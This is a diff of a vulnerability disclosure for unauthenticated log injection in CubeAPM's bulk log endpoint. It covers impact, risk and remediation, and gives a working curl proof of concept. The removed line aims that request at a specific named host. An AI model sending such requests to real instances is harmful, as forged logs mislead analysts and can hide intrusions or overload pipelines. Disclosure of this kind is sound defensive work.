@@ -1,2 +1,29 @@
-curl -X POST http://observability-nonprod.fxtrt.io:3130/api/logs/insert/elasticsearch/_bulk   -H Content-Type: application/x-ndjson   --data-binary $'{ index: { _index: logs } }\n{ @timestamp: 2025-08-07T09:20:00Z, level: critical, message: Before request [GET /kuchbhi, client=10.6.66.66], application: bla, service.name: bla, env: dev, subsystemName: aws-waf-dev }'
 
+Title: Unauthenticated Log Injection in CubeAPM
+
+Summary:
+A critical vulnerability was discovered in CubeAPM where an unauthenticated endpoint allows arbitrary log data injection. This enables attackers to submit crafted log entries directly into the system, potentially polluting dashboards and obfuscating real-time telemetry.
+
+Proof of Concept (PoC):
+The following curl request demonstrates the vulnerability, successfully injecting logs without any form of authentication:
+
+curl -X POST "http://<Instance>:3130/api/logs/insert/elasticsearch/_bulk" \
+  -H "Content-Type: application/x-ndjson" \
+  --data-binary $'{ "index": { "_index": "logs" } }\n{ "@timestamp": "2025-08-07T09:20:00Z", "level": "critical", "message": "Before request [GET /kuchbhi, client=10.6.66.66]", "application": "bla", "service.name": "bla", "env": "dev", "subsystemName": "aws-waf-dev" }'
+
+Impact:
+1. **False Log Injection**: Attackers can forge arbitrary log entries to mislead analysts or systems.
+2. **Log Poisoning**: Critical dashboards and metrics may be corrupted, leading to poor operational decisions.
+3. **Attack Obfuscation**: Injected noise can hide indicators of compromise or real alerts.
+4. **Denial of Service**: Excessive unauthenticated injection can overload the logging pipeline or cause performance degradation.
+
+Affected Endpoint:
+POST /api/logs/insert/elasticsearch/_bulk
+
+Security Risk:
+High – This vulnerability affects the integrity and availability of log data, which can be leveraged during attack chains for evasion or sabotage.
+
+Suggested Remediation:
+Implement authentication and input validation for the log ingestion endpoint. Restrict access to trusted services only.
+
+Discovered by: Prasann Nuwal
